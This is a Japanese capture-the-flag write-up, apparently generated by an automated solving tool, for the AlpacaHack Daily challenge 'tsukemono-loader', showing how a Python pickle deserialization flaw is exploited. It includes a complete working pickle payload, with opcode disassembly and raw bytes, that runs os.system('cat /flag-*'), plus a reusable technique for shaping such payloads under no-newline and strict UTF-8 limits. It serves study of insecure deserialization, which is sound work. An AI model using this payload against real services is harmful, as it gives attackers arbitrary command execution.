# Tsukemono Loader

| 項目 | 内容 |
| --- | --- |
| 大会 | AlpacaHack Daily |
| 問題番号 | tsukemono-loader |
| カテゴリ | misc |
| 配点 | 1 |
| 状態 | 解決済み（公式判定で正解: 2026-11-13 20:02 JST） |
| Flag | `⟦answer:writeups/alpacahack-daily/tsukemono-lo-tsukemono-loader.md#1⟧` |
| Flag照合 | 公式判定で正解した文字列と一致 |
| タグ | misc, pickle, rce, deserialization, python, utf-8 |
| 問題URL | https://alpacahack.com/daily/challenges/tsukemono-loader |
| METIS run | `22f0dee718e94a16b67252e778e63ca0` |

## 概要

pickle.loads(input().encode()) に対し、改行を含まない妥当なUTF-8のみで構成したpickleを送ってRCEし、ランダム名のフラグファイルを cat /flag-* で読み出した。

## 解析

server.py は __import__("pickle").loads(input("> ").encode()) のみ。フラグは Dockerfile で /flag-<md5>.txt に改名されておりファイル名が不明なため、デシリアライズによる任意コマンド実行が必要。制約は2点。(1) input() は1行読みなので改行を含められない（テキストモードの universal newlines により \r も不可）。(2) Python 3.15 は UTF-8 mode がデフォルトで、入力の不正バイトは surrogateescape で取り込まれた後 .encode()（strict）で失敗するため、payload 全体が妥当なUTF-8でなければならない。protocol 0 の GLOBAL ('c') は改行終端で使えないので、STACK_GLOBAL (0x93) と BINUNICODE ('X' + 4バイト長 + UTF-8) を使う。os.system を STACK_GLOBAL でスタックに積み、引数タプルを MARK/TUPLE で作って REDUCE で呼ぶ。生成した各バイトが改行を含まず全体が妥当なUTF-8であることを静的に検証してから送信した。

## 解法

## 解法

server.py:
```python
__import__("pickle").loads(input("> ").encode())
```

### 制約
- `input()` の1行読みのため payload に改行（`\n` / universal newlines で `\r`）を含められない。
- Python 3.15 の UTF-8 mode + `str.encode()`(strict) のため、payload 全体が妥当なUTF-8である必要がある。

### payload 生成
`BINUNICODE`('X' + 4バイトリトルエンディアン長 + UTF-8文字列) と `STACK_GLOBAL`(0x93) で os.system を解決し、`MARK`/`TUPLE`/`REDUCE` で `os.system('cat /flag-*')` を呼ぶ。

```
    0: X    BINUNICODE 'os'
    7: X    BINUNICODE 'system'
   18: q    BINPUT     194
   20: \x93 STACK_GLOBAL
   21: (    MARK
   22: X        BINUNICODE 'cat /flag-*'
   38: t        TUPLE
   39: R    REDUCE
   40: .    STOP
```

バイト列: `X\x02\x00\x00\x00osX\x06\x00\x00\x00systemq\xc2\x93(X\x0b\x00\x00\x00cat /flag-*tR.`

`q\xc2` の BINPUT 引数に 0xc2 を選ぶことで、続く 0x93 と合わせて `\xc2\x93` が妥当なUTF-8（U+0093）になり、全体がUTF-8デコード可能になる。改行は含まれない。

### 送信
METIS の `metis remote exchange` で `> ` を待ってから payload を hex 送信し、`Alpaca{...}` を受信。ブラウザのフォームから1回だけ提出して正解を確認した。

## 使用したスクリプト

- [tsukemono_gen.py](files/tsukemono-lo/tsukemono_gen.py)

## 学び・再利用できる手法

input() 経由の pickle は『改行なし』に加え Python 3.15 の UTF-8 mode では『全体が妥当なUTF-8』という制約が付く。BINPUT の引数バイトを UTF-8 継続バイトとして利用し、後続の STACK_GLOBAL オペコード(0x93)と組み合わせて妥当なマルチバイト文字に仕立てるのが鍵。

- **改行禁止・UTF-8必須の制約下での pickle RCE payload 整形**（misc）: input() 由来のテキスト入力を encode() して pickle.loads に渡すサービスでは、payload に改行を含められず、かつ全体が妥当なUTF-8である必要がある。protocol0 の改行終端 GLOBAL を避け STACK_GLOBAL(0x93)+BINUNICODE で関数を解決し、直前の BINPUT 等の引数バイトを UTF-8 継続バイト(0x80-0xBF)に選んで後続オペコードと妥当なマルチバイト文字を構成することで UTF-8 制約を満たす。生成後に『改行なし』『strict UTF-8 デコード可』を静的検証してから送る。
  - 適用条件: pickle.loads(input(...).encode()) 形式で、1行読み＋テキストエンコード（特に Python 3.11+ / UTF-8 mode デフォルトの環境）によりバイト列に制約が課される場合。

## METISの記録

- 期間: 2026-11-13 19:59 JST 〜 2026-11-13 20:02 JST
- 使用アクション数: 3（official_flag_submission_browser ×1, read_only_artifact_analysis ×1, remote_service_exchange ×1）
- 判定方式: official_browser_observed

### 提出履歴

| 時刻 | 判定 | 回数 |
| --- | --- | --- |
| 2026-11-13 20:02 JST | correct | 1 |

### 配布ファイル・取得データ

| ファイル | サイズ | SHA-256 |
| --- | --- | --- |
| 00-problem.html | 368,917 | `df213c805b0a70223d83261b26d045c7e469f7f88d08dd012b7bc3830c88b9a4` |
| 01-00-tsukemono-loader.tar.gz | 702 | `ea69e732655d880234a566718d98eb3f32ef61295cf1cb611cd477b8dc6112d5` |
| .metis-remote/db173c1c35af40ea8dec698f4318fcbf.recv | 32 | `73f30e0967cdf662c855e135beba933a6166caea73a69b1ce3c5d2138a442708` |
| .metis-remote/ba5acf6b6df74e6b88899cf409eff752.json | 232 | `f2d05024b539a884e5cb30ed0c97452e12c716f258c351d426d012cfd939315d` |

### 接続先

- 34.170.146.252:40760

<sub>METIS writeup — 更新: 2026-11-13 20:04 JST</sub>
